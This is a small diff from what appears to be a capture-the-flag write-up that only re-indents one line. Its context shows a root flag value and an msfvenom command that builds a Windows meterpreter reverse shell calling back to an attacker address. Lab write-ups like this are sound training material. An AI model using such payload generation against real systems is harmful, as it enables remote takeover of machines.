@@ -387,7 +387,7 @@
 
 [Challenge 2] Locate and find the Root Flag => {Th3_M4y0r_C0ngr4tul4t3s_U}
 
-[+] In this case, we need a better shell since curl or wget can't be run in this machine
+    [+] In this case, we need a better shell since curl or wget can't be run in this machine
 
     # msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.14.56.1 LPORT=4321 -f exe -f python -b "\x00\x0a" EXITFUNC=thread
 
